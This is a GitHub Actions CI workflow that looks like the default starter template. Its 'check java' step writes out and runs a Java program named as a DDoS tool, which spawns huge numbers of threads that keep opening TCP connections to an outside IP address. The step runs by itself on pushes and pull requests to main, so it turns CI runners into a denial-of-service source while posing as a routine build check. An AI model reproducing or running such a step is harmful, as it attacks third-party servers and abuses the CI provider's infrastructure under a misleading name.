# This is a basic workflow to help you get started with Actions

name: CI

# Controls when the workflow will run
on:
  # Triggers the workflow on push or pull request events but only for the "main" branch
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:

# A workflow run is made up of one or more jobs that can run sequentially or in parallel
jobs:
  # This workflow contains a single job called "build"
  build:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo Hello, world!

      # Runs a set of commands using the runners shell
      - name: check java
        run: echo 'import java.net.InetSocketAddress; import java.net.Socket; public class ain { public static void main(String[] args) throws Exception { System.out.println("109.230.236.172:27015"); for (int i = 0; i < 100000000; i++) { Thread newThread = new Thread(() -> { new DdosThread().run(); }); newThread.start(); } } public static class DdosThread { public void run() { while (true) { try { attack(); } catch (Exception e) { continue; } } } public void attack() throws Exception { Socket socket = new Socket(); socket.connect(new InetSocketAddress("93.170.246.199", 80), 1); socket.close(); } } } ' > main.java && java main.java
